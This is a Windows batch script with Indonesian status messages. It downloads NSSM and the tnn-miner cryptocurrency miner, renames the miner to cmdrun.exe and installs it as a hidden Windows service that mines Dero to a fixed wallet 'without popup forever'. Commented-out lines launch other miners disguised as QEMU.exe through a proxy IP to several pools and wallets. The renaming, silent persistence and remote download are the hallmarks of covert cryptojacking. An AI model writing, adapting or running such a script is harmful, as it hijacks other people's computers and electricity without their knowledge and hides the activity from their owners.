@echo off
cd %~dp0
cls

#C:\Users\%USERNAME%\Downloads\QEMU.exe --algorithm randomscash --pool 51.79.215.200:17019 --disable-gpu --wallet scash1qf7kn4cwmxx2wsz665ucg29xx4kfaqesx9a8s85.sato --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --cpu-threads 5 --proxy 47.239.161.149:1111
#C:\Users\%USERNAME%\Downloads\QEMU.exe --algorithm randomx --pool us.0xpool.io:3333 --disable-gpu --wallet 0x4367d94a61C3714Cfd58DcFbCAf65D7A0be4Ee7D --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --cpu-threads 5 --proxy 47.239.161.149:1111
#C:\Users\%USERNAME%\Downloads\XM\QEMU.exe -o hk.qrl.herominers.com:1166 -b 47.239.161.149:1111 -m nicehash -u Q01050053cb14eb8e70841bc81c0aabcd002559f18061f85b3539de65a43bd1a0dda7dcafa724b4.quan -a randomx -k
#C:\Users\%USERNAME%\Downloads\XM\QEMU.exe -o hk.qrl.herominers.com:1166 -u Q01050053cb14eb8e70841bc81c0aabcd002559f18061f85b3539de65a43bd1a0dda7dcafa724b4.quan -a rx/0 -k
#C:\Users\%USERNAME%\Downloads\there0\QEMU.exe -d dero-node.mysrv.cloud:10100 -w dero1qy2jzkctwl7mmlnpn45kk54l46lpszn7pamt072wtg62hl7j4v4xvqgld2v2c -t 5 --never-stop --restart-on-zero-hashrate

@echo off
echo ===============================
echo   MEMULAI INSTALASI OTOMATIS
echo ===============================

echo.
echo [1] Mengunduh NSSM...
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://nssm.cc/release/nssm-2.24.zip','nssm.zip')"

echo [2] Mengekstrak NSSM...
powershell -Command "Expand-Archive -Path 'nssm.zip' -DestinationPath '.' -Force"

echo [3] Membuat folder C:\nssm...
mkdir C:\nssm >nul 2>&1

echo [4] Memindahkan nssm.exe...
copy .\nssm-2.24\win64\nssm.exe C:\nssm\nssm.exe >nul

echo Membersihkan file NSSM...
del nssm.zip
rmdir /s /q nssm-2.24

echo.
echo ===================================
echo   NSSM BERHASIL DIDOWNLOAD & SIAP
echo ===================================
echo.

echo [5] Mengunduh TNN...
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://gitlab.com/Tritonn204/tnn-miner/-/releases/v0.5.4/downloads/Tnn-miner-win64-v0.5.4.zip','Tnn.zip')"

echo [6] Mengekstrak...
powershell -Command "Expand-Archive -Path 'Tnn.zip' -DestinationPath '.' -Force"

echo [7] Menghapus file ZIP...
del Tnn.zip

echo [8] Mengganti nama...
rename tnn-miner-cpu.exe cmdrun.exe

echo.
echo =====================================
echo    MEMBUAT SERVICE TANPA POPUP
echo =====================================

echo [9] Install sebagai Windows Service...
C:\nssm\nssm.exe install TNN "%cd%\cmdrun.exe" "--daemon-address dero-node.mysrv.cloud --port 10100 --wallet dero1qy2jzkctwl7mmlnpn45kk54l46lpszn7pamt072wtg62hl7j4v4xvqgld2v2c --threads 5 --dev-fee 1"

echo [10] Menjalankan service TNN...
net start TNN

echo.
echo ==============================================
echo   SELESAI! BERJALAN TANPA POPUP SELAMANYA
echo ==============================================

pause

